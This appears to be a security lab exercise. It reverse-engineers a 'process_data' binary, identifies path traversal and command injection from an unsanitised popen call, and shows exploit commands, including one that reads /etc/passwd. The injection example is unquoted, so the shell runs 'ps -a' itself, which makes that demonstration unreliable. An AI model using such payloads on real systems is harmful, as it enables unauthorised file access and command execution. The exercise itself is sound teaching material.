Exercise: Process Data 
-------------------------------------------------------------------------------

Given a binary which processes measurement data:

$ ./process_data measurement-001.txt
timestamp,float_value
2023-11-13 17:31:38.190099,0.7955792252715449
2023-11-13 17:32:38.190099,4.7054602824073815
2023-11-13 17:33:38.190099,3.890522501618472
...

A) Reverse Engineering 
Use reverse engineering techniques to find out some vulnerabilities in the 
given binary.

List of vunerabilities:
i) Path Traversal 
    snprintf(command, COMMAND_SIZE, "cat data/%s", argv[1]);
    // String concatination with user provided data (argv[1]) 

ii) OS Command Injection
    snprintf(command, COMMAND_SIZE, "cat data/%s", argv[1]);
    FILE *pipe = popen(command, "r");
    // String concatination with user provided data (argv[1]) 
    // Delegation of the command-string to the bash 


B) Exploit 
Based on the list of found vulnerabilities, create an attack to exploit 
each vulnerability.

i) Path Traversal 
    $ ./process_data ../../../../../../../../etc/passwd
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    ...

ii) OS Command Injection
    $  ./process_data measurement-001.txt; ps -a
        ...
        023-11-13 17:53:38.190099,4.058164355265291
        2023-11-13 17:54:38.190099,2.2324275678334637
        2023-11-13 17:55:38.190099,1.342864544053199
        PID TTY          TIME CMD
        5877 pts/1    00:00:44 java
        5964 pts/1    00:00:00 demangler_gnu_v
        5969 pts/1    00:00:00 decompile
        7020 pts/3    00:00:00 ps


